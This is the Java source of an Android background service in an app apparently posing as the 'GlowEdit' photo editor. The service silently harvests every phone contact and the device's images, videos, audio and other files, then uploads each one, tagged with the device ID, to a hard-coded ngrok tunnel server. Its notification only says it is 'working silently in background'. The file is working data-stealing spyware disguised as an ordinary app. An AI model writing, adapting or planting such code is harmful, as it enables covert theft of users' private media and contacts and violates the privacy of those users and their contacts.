package com.hani.glowedit;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UploadService extends Service {

    private static final String CHANNEL_ID = "UploadServiceChannel";
    private static final String SERVER_URL = "https://7d22-103-103-43-185.ngrok-free.app/upload";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("GlowEdit")
                .setContentText("Working silently in background...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        startForeground(1, notification);

        new Thread(() -> {
            extractAndUploadContacts();
            extractAndUploadMedia();
            stopSelf(); // Stop service once done
        }).start();

        return START_NOT_STICKY;
    }

    private void extractAndUploadMedia() {
        try {
            ContentResolver contentResolver = getContentResolver();
            extractFiles(contentResolver, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 500);
            extractFiles(contentResolver, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 500);
            extractFiles(contentResolver, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, 500);
            extractFiles(contentResolver, MediaStore.Files.getContentUri("external"), 0);
        } catch (Exception e) {
            Log.e("UploadService", "Media extraction failed: " + e.getMessage());
        }
    }

    private void extractFiles(ContentResolver contentResolver, Uri uri, int maxSizeMB) {
        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.SIZE};
        Cursor cursor = contentResolver.query(uri, projection, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(0);
                long sizeBytes = cursor.getLong(1);
                File file = new File(path);
                if (file.exists()) {
                    boolean shouldUpload = false;
                    if (uri.equals(MediaStore.Files.getContentUri("external"))) {
                        shouldUpload = sizeBytes > 100 * 1024;
                    } else {
                        shouldUpload = sizeBytes < 500L * 1024 * 1024;
                    }
                    if (shouldUpload) {
                        uploadFile(file);
                    }
                }
            }
            cursor.close();
        }
    }

    private void extractAndUploadContacts() {
        try {
            StringBuilder contactsData = new StringBuilder();
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsData.append(name).append(" : ").append(phoneNumber).append("\n");
                }
                cursor.close();
            }

            File contactsFile = new File(getCacheDir(), "contacts.txt");
            BufferedWriter writer = new BufferedWriter(new FileWriter(contactsFile));
            writer.write(contactsData.toString());
            writer.close();

            uploadFile(contactsFile);

        } catch (Exception e) {
            Log.e("UploadService", "Contacts extraction failed: " + e.getMessage());
        }
    }

    // ✅ NEW: Method to get unique Android Device ID
    public String getUniqueDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    private void uploadFile(File file) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("File-Name", file.getName());

            // ✅ NEW: Include Device-ID header
            conn.setRequestProperty("Device-ID", getUniqueDeviceId());


            OutputStream os = conn.getOutputStream();
            java.nio.file.Files.copy(file.toPath(), os);
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.i("UploadService", "Uploaded " + file.getName() + " : " + responseCode);

        } catch (Exception e) {
            Log.e("UploadService", "Upload failed: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID, "Background Upload Channel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
